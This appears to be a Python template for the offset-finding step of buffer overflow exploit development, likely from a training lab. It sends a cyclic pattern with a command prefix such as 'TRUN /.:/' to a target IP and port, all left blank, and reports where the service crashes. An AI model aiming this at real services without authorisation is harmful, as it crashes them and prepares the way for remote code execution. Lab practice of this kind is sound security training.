#!/usr/bin/env python3

import socket, time, sys
from time import sleep

ip = ""

port = 			          # Integer
timeout = 5               # Integer
return_value = "\r\n"     # Does the server take input that requires enter for input? Send empty if not required

# Use pattern_create.rb -l <length> and place it inside the string value

string = "" 
prefix = ""               # Is there an initial command required? e.g TRUN /.:/

try:
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect((ip, port))
      s.settimeout(timeout) # Helpful for stopping when overflow occurs
      print("Fuzzing with {} bytes".format(len(string)))
      s.send(bytes(prefix, "latin1") + bytes(string, "latin1") + bytes(return_value, "latin1")) # Send the string as bytes rather than characters. Helpful later when adding a payload
      s.recv(1024) # Wait 
      s.close()
except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
